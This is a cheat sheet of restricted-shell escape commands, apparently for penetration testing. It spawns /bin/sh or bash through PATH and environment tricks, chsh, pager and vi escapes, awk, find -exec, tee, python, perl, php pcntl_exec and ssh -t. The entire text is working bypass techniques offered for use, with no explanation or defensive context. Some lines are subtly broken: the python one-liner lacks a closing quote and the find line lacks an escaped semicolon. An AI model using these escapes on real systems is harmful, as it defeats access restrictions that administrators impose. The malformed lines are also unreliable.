### check for writeable environment variables - if the PATH is writeable, set it to /bin/sh or similar
```
env
export -p
```

### if / is allowed in commands
```
export PATH=/bin:/usr/bin:/sbin:$PATH
export SHELL=/bin/sh
```

### change the shell
```
chsh
```

### copy into existing PATH
```
cp /bin/sh <path/to/directory>; sh
```

### more, less, man, ftp,gdb
```
!/bin/sh
```

### vi, vim
```
:!/bin/sh
```

### awk
```
awk 'BEGIN {system("/bin/sh")}'
```

### find
```
find / -name <string> -exec /bin/sh ;
```

### tee
```
echo "<command>" | tee <file>.sh
```

### python
```
python -c 'import os; os.system("/bin/bash")
```

### perl
```
perl -e 'exec "/bin/sh";'
```

### php
```
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

### ssh
```
ssh <user>@<rhost> -t "/bin/sh"
ssh <user>@<rhost> -t "bash --noprofile"
```

